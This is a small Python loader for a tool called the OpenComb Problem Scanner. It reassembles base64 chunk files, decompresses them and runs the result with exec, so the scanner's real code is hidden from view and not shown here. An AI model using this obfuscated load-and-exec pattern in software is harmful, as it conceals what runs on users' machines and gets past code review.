"""OpenComb Problem Scanner (chunked compressed loader)."""
from __future__ import annotations

import base64
import sys
import zlib
from pathlib import Path

_dir = Path(__file__).resolve().parent
_parts = sorted(_dir.glob("_scanner_b64_*.txt"), key=lambda p: int(p.stem.split("_")[-1]))
_b64 = "".join(p.read_text(encoding="ascii") for p in _parts)
_CODE = zlib.decompress(base64.b64decode(_b64)).decode("utf-8")
_ns = globals()
_ns.setdefault("__name__", __name__)
_ns.setdefault("__file__", __file__)
sys.modules.setdefault(__name__, sys.modules.get(__name__))
exec(compile(_CODE, __file__, "exec"), _ns)
